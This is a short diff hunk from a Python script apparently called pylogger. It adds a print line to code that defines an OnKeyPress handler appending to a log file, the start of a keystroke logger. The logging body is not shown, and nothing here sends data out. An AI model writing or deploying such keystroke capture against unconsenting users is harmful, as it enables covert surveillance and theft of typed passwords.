@@ -19,6 +19,7 @@ if os.environ.get('pylogger_clean',None) is not None:
         pass
 
 print("hello")
+print("ENGA PORA")
     # on key press file to test my app
 def OnKeyPress(event):
     with open(file_log,'a') as f:
